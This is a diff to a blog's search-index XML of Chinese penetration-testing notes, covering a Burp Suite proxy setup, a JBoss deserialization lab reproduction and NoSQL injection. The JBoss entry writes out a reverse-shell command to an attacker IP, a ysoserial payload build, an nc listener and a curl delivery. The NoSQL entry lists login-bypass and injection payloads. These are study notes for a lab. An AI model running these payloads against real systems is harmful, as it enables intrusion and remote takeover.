@@ -66,29 +66,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Burpsuite挂梯子抓包</title>
-    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
-<p>然而挂了代理之后，bp就无法使用了。</p>
-<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" alt="image-20210809165555796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" class="lozad post-image"></p>
-<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
-<p>2、点击Add</p>
-<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" alt="image-20210809165603927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>
-
-<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
-<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
-<p>4、效果</p>
-<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" alt="image-20210809165614071" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" class="lozad post-image"></p>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>BurpSuite代理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Burpsuite绕过Token爆破</title>
     <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
@@ -147,6 +124,29 @@
       </categories>
       <tags>
         <tag>绕过Token爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Burpsuite挂梯子抓包</title>
+    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
+<p>然而挂了代理之后，bp就无法使用了。</p>
+<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" alt="image-20210809165555796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" class="lozad post-image"></p>
+<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
+<p>2、点击Add</p>
+<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" alt="image-20210809165603927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>
+
+<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
+<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
+<p>4、效果</p>
+<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" alt="image-20210809165614071" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>BurpSuite代理</tag>
       </tags>
   </entry>
   <entry>
@@ -232,6 +232,38 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss反序列化漏洞复现</title>
+    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
+<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
+<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
+<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
+<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
+<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
+<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
+<p>攻击机：192.168.66.138</p>
+<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
+
+<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
+
+<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
+<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
+
+<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
+
+<p>注：poc版本&gt;=5</p>
+<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>JBoss</tag>
       </tags>
   </entry>
   <entry>
@@ -1410,38 +1442,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JBoss反序列化漏洞复现</title>
-    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
-<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
-<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
-<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
-<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
-<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
-<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
-<p>攻击机：192.168.66.138</p>
-<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
-
-<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
-
-<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
-<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
-
-<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
-
-<p>注：poc版本&gt;=5</p>
-<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>JBoss</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript基础</title>
     <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
@@ -2433,273 +2433,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Nosql注入</title>
-    <url>/article/Nosql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>泛指非关系型的数据库，多和关系型数据库共存</p>
-<p>特点：</p>
-<p>不要预定义表，可以存储非结构化数据，数据量大，用于模糊处理，使用灵活，可拓展等</p>
-<p>代表数据库：</p>
-<p>MongoDB（默认端口号27017）、Redis（默认端口号：6379）、Memcache</p>
-<p>数据类型：</p>
-<table>
-<thead>
-<tr>
-<th align="left">类型</th>
-<th align="left">用法</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">布尔型</td>
-<td align="left">{“a”:true}</td>
-<td align="left">与java的boolean一样</td>
-</tr>
-<tr>
-<td align="left">Null</td>
-<td align="left">{“a”:null}</td>
-<td align="left">null表示空值或者不存在的字段</td>
-</tr>
-<tr>
-<td align="left">数值</td>
-<td align="left">{“a”:1.34}{“a”:NumberInt(“3”)} 表示4字节的整数</td>
-<td align="left">不区分整数或浮点</td>
-</tr>
-<tr>
-<td align="left">字符串</td>
-<td align="left">{“a”:”string”}</td>
-<td align="left">UTF-8的字符串</td>
-</tr>
-<tr>
-<td align="left">日期</td>
-<td align="left">{“a”:newDate()}</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">数组</td>
-<td align="left">{“a”:[“b”,”c”,”d”]}</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">内嵌文档</td>
-<td align="left">{“a”:{“b”:”c”:”d”}}</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">对象id</td>
-<td align="left">{“a”:ObjectID()}</td>
-<td align="left">对象id一个12字节的ID，文档的唯一表示，对象的默认主键_id就是一个对象id</td>
-</tr>
-</tbody></table>
-<h1 id="MongoDB操作"><a href="#MongoDB操作" class="headerlink" title="MongoDB操作"></a>MongoDB操作</h1><table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">开启服务</td>
-<td align="left">sudo mongod</td>
-</tr>
-<tr>
-<td align="left">登陆mongodb数据库</td>
-<td align="left">mongo –host 127.0.0.1</td>
-</tr>
-</tbody></table>
-<p>数据库的操作</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查看所有的数据库</td>
-<td align="left">show dbs</td>
-</tr>
-<tr>
-<td align="left">切换数据库</td>
-<td align="left">use 数据库名</td>
-</tr>
-<tr>
-<td align="left">查看集合</td>
-<td align="left">show collections</td>
-</tr>
-<tr>
-<td align="left">数据库的创建</td>
-<td align="left">user数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。</td>
-</tr>
-<tr>
-<td align="left">删除数据库</td>
-<td align="left">进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库</td>
-</tr>
-</tbody></table>
-<p>集合的操作</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查看集合</td>
-<td align="left">show collections</td>
-</tr>
-<tr>
-<td align="left">创建集合</td>
-<td align="left">db.createCollection(“xxx”)</td>
-</tr>
-<tr>
-<td align="left">删除集合</td>
-<td align="left">db.xxx.drop()</td>
-</tr>
-</tbody></table>
-<p>文档(行)的增删改</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">增加数据</td>
-<td align="left">db.xx.insert({key:value}) <br>举例：<br>db.ichunqiu.insert({_id:1,name:”web”,age:10})</td>
-</tr>
-<tr>
-<td align="left">删除数据</td>
-<td align="left">db.xx.remove(删除的条件) <br>1、全部删除： <br>db.xx.remove({})  <br>2、根据条件删除，默认是删除所有符合条件的数据： <br>db.xx.remove({age:10})  <br>3、只删除符合条件的第一个： <br>db.xx.remove({gender:true},{justOne:true})</td>
-</tr>
-<tr>
-<td align="left">更改操作</td>
-<td align="left">db.xx.update({查找的条件}，{修改的内容}) <br>1、修改内容： <br>默认其他原有字段删除了，替换掉原有数据db.xx.update({age:10},{name:”NoSQL ”})  <br>2、保持原有的字段，加一个修饰$set： <br>默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加db.stu.update({age:10},{$set:{like:“study”}}) <br>说明：把like:”study”添加到数据里面，并不是替换</td>
-</tr>
-</tbody></table>
-<p>文档查询简单语句：</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">基本查询</td>
-<td align="left">db.xx.find({查询条件}) <br>1、查询所有的数据： <br>db.xx.find() 或db.xx.find({})  <br>2、默认查出所有符合条件的数据： <br>db.xx.find({age:10})  <br>3、查找符合条件的第一个： <br>db.xx.findOne({age:10})  <br>4、格式化输出——pretty()函数： <br>db.xx.find({age:10}).pretty()</td>
-</tr>
-<tr>
-<td align="left">条件查询</td>
-<td align="left">举例： <br>db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的 <br>db.xx.find({age:{$ne:18}}) 查询年龄不等于18的</td>
-</tr>
-<tr>
-<td align="left">逻辑运算</td>
-<td align="left">$and，$or <br>1、$and： <br>默认的的查询条件就是且的关系 <br>举例： <br>db.xx.find({age:28,gender:true})db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女  <br>2、$or：<br>或的关系 举例：<br>db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男</td>
-</tr>
-</tbody></table>
-<p>条件查询–常用条件：</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">字符</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">$lt</td>
-<td align="left">&lt;</td>
-</tr>
-<tr>
-<td align="left">$ne</td>
-<td align="left">!=</td>
-</tr>
-<tr>
-<td align="left">$or</td>
-<td align="left">or</td>
-</tr>
-<tr>
-<td align="left">$lte</td>
-<td align="left">&lt;=</td>
-</tr>
-<tr>
-<td align="left">$in</td>
-<td align="left">in</td>
-</tr>
-<tr>
-<td align="left">$not</td>
-<td align="left">反匹配(1.3.3及以上版本)</td>
-</tr>
-<tr>
-<td align="left">$gt</td>
-<td align="left">&gt;</td>
-</tr>
-<tr>
-<td align="left">$nint</td>
-<td align="left">not in</td>
-</tr>
-<tr>
-<td align="left">$regex</td>
-<td align="left">正则</td>
-</tr>
-<tr>
-<td align="left">$gte</td>
-<td align="left">&gt;=</td>
-</tr>
-<tr>
-<td align="left">$all</td>
-<td align="left">all</td>
-</tr>
-</tbody></table>
-<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><table>
-<thead>
-<tr>
-<th align="left">分类</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">综合分类（4种）</td>
-<td align="left">重言式/永真式（重要） <br>JavaScript注入（难度较大） <br>联合查询注入（被淘汰） <br>mongo shell拼接注入（难度中等，危害大）</td>
-</tr>
-<tr>
-<td align="left">语言、代码逻辑角度分类（3种）</td>
-<td align="left">PHP数组注入<br> JS注入 <br>Mongo shell拼接注入</td>
-</tr>
-<tr>
-<td align="left">攻击手段角度分类（3种）</td>
-<td align="left">重言式（永真式） <br>联合查询<br> JavaScript注入</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="left">分类</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">重言式/永真式</td>
-<td align="left"><code>/login.php?username[$ne]=1&amp;password[$ne]=1</code> <br>防御： <br>可以通过函数is_array()将输入参数转变为字符串类型来解决 <br>如：<br><code>db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); </code><br><br>注意： <br>1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） <br>2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 <br>3、使用正则表达式,也可以构造永真式如：<br><code>username[$regex]=.?&amp;password[$regex]=.?</code><br>.?为匹配所有字符串<br>变为 <code>?username[$regex]=^a&amp;password[$regex]=.? </code><br>不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义</td>
-</tr>
-<tr>
-<td align="left">JavaScript注入</td>
-<td align="left"><code>&#39;;return true;var a=&#39;</code> <br>注入产生的原因 <br>1、MongoDB中$where操作符是可以执行JavaScript语句的。 <br>2、在PHP语言中是不能直接写入JavaScript语句的，需要写在字符串中。使用字符串就会引用到单引号和双引号，因此容易出现闭合的问题 <br>3、在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性。也就是说可以操作数据库中的数据。  <br><br>注意： <br>1、闭合的方法有很多，只要return的值为真即可。 <br>2、该注入方法较难，主要是因为payload不易构造，在有源码的情况下容易构造闭合语句，没有源码只能猜测。 <br>3、$where执行的JavaScript语句只能进行简单的逻辑操作。</td>
-</tr>
-<tr>
-<td align="left">mongo shell拼接注入</td>
-<td align="left"><code>&quot;&#125;);db.表名.insert(&#123;&quot;name&quot;:&quot;hi&quot;&#125;);db.表名.find(&#123;&quot;author&quot;:&quot;1 </code><br>在两个db.message.find中间的位置，插入任意想要执行的代码  <br>产生的原因： <br>PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>Nosql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mysql注入</title>
     <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>端口：3306</p>
@@ -3237,6 +2970,577 @@
       </categories>
       <tags>
         <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nosql注入</title>
+    <url>/article/Nosql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>泛指非关系型的数据库，多和关系型数据库共存</p>
+<p>特点：</p>
+<p>不要预定义表，可以存储非结构化数据，数据量大，用于模糊处理，使用灵活，可拓展等</p>
+<p>代表数据库：</p>
+<p>MongoDB（默认端口号27017）、Redis（默认端口号：6379）、Memcache</p>
+<p>数据类型：</p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">用法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">布尔型</td>
+<td align="left">{“a”:true}</td>
+<td align="left">与java的boolean一样</td>
+</tr>
+<tr>
+<td align="left">Null</td>
+<td align="left">{“a”:null}</td>
+<td align="left">null表示空值或者不存在的字段</td>
+</tr>
+<tr>
+<td align="left">数值</td>
+<td align="left">{“a”:1.34}{“a”:NumberInt(“3”)} 表示4字节的整数</td>
+<td align="left">不区分整数或浮点</td>
+</tr>
+<tr>
+<td align="left">字符串</td>
+<td align="left">{“a”:”string”}</td>
+<td align="left">UTF-8的字符串</td>
+</tr>
+<tr>
+<td align="left">日期</td>
+<td align="left">{“a”:newDate()}</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">数组</td>
+<td align="left">{“a”:[“b”,”c”,”d”]}</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">内嵌文档</td>
+<td align="left">{“a”:{“b”:”c”:”d”}}</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">对象id</td>
+<td align="left">{“a”:ObjectID()}</td>
+<td align="left">对象id一个12字节的ID，文档的唯一表示，对象的默认主键_id就是一个对象id</td>
+</tr>
+</tbody></table>
+<h1 id="MongoDB操作"><a href="#MongoDB操作" class="headerlink" title="MongoDB操作"></a>MongoDB操作</h1><table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">开启服务</td>
+<td align="left">sudo mongod</td>
+</tr>
+<tr>
+<td align="left">登陆mongodb数据库</td>
+<td align="left">mongo –host 127.0.0.1</td>
+</tr>
+</tbody></table>
+<p>数据库的操作</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查看所有的数据库</td>
+<td align="left">show dbs</td>
+</tr>
+<tr>
+<td align="left">切换数据库</td>
+<td align="left">use 数据库名</td>
+</tr>
+<tr>
+<td align="left">查看集合</td>
+<td align="left">show collections</td>
+</tr>
+<tr>
+<td align="left">数据库的创建</td>
+<td align="left">user数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。</td>
+</tr>
+<tr>
+<td align="left">删除数据库</td>
+<td align="left">进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库</td>
+</tr>
+</tbody></table>
+<p>集合的操作</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查看集合</td>
+<td align="left">show collections</td>
+</tr>
+<tr>
+<td align="left">创建集合</td>
+<td align="left">db.createCollection(“xxx”)</td>
+</tr>
+<tr>
+<td align="left">删除集合</td>
+<td align="left">db.xxx.drop()</td>
+</tr>
+</tbody></table>
+<p>文档(行)的增删改</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">增加数据</td>
+<td align="left">db.xx.insert({key:value}) <br>举例：<br>db.ichunqiu.insert({_id:1,name:”web”,age:10})</td>
+</tr>
+<tr>
+<td align="left">删除数据</td>
+<td align="left">db.xx.remove(删除的条件) <br>1、全部删除： <br>db.xx.remove({})  <br>2、根据条件删除，默认是删除所有符合条件的数据： <br>db.xx.remove({age:10})  <br>3、只删除符合条件的第一个： <br>db.xx.remove({gender:true},{justOne:true})</td>
+</tr>
+<tr>
+<td align="left">更改操作</td>
+<td align="left">db.xx.update({查找的条件}，{修改的内容}) <br>1、修改内容： <br>默认其他原有字段删除了，替换掉原有数据db.xx.update({age:10},{name:”NoSQL ”})  <br>2、保持原有的字段，加一个修饰$set： <br>默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加db.stu.update({age:10},{$set:{like:“study”}}) <br>说明：把like:”study”添加到数据里面，并不是替换</td>
+</tr>
+</tbody></table>
+<p>文档查询简单语句：</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">基本查询</td>
+<td align="left">db.xx.find({查询条件}) <br>1、查询所有的数据： <br>db.xx.find() 或db.xx.find({})  <br>2、默认查出所有符合条件的数据： <br>db.xx.find({age:10})  <br>3、查找符合条件的第一个： <br>db.xx.findOne({age:10})  <br>4、格式化输出——pretty()函数： <br>db.xx.find({age:10}).pretty()</td>
+</tr>
+<tr>
+<td align="left">条件查询</td>
+<td align="left">举例： <br>db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的 <br>db.xx.find({age:{$ne:18}}) 查询年龄不等于18的</td>
+</tr>
+<tr>
+<td align="left">逻辑运算</td>
+<td align="left">$and，$or <br>1、$and： <br>默认的的查询条件就是且的关系 <br>举例： <br>db.xx.find({age:28,gender:true})db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女  <br>2、$or：<br>或的关系 举例：<br>db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男</td>
+</tr>
+</tbody></table>
+<p>条件查询–常用条件：</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$lt</td>
+<td align="left">&lt;</td>
+</tr>
+<tr>
+<td align="left">$ne</td>
+<td align="left">!=</td>
+</tr>
+<tr>
+<td align="left">$or</td>
+<td align="left">or</td>
+</tr>
+<tr>
+<td align="left">$lte</td>
+<td align="left">&lt;=</td>
+</tr>
+<tr>
+<td align="left">$in</td>
+<td align="left">in</td>
+</tr>
+<tr>
+<td align="left">$not</td>
+<td align="left">反匹配(1.3.3及以上版本)</td>
+</tr>
+<tr>
+<td align="left">$gt</td>
+<td align="left">&gt;</td>
+</tr>
+<tr>
+<td align="left">$nint</td>
+<td align="left">not in</td>
+</tr>
+<tr>
+<td align="left">$regex</td>
+<td align="left">正则</td>
+</tr>
+<tr>
+<td align="left">$gte</td>
+<td align="left">&gt;=</td>
+</tr>
+<tr>
+<td align="left">$all</td>
+<td align="left">all</td>
+</tr>
+</tbody></table>
